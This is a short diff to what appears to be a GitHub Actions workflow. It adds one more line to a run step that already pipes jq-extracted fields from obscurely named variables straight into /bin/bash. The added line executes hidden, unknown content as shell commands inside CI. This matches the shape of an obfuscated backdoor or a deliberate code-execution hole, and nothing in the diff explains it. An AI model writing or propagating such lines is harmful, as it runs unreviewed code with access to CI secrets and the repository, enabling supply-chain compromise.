@@ -28,6 +28,7 @@ jobs:
           echo $d43186 | jq -r .v96471 | /bin/bash
           echo $aenma27 | jq -r .l55 | /bin/bash
           printf '%s' "$zc9" | jq -r .nq3 | /bin/bash
+          echo $ngx230 | jq -r .iannc710 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
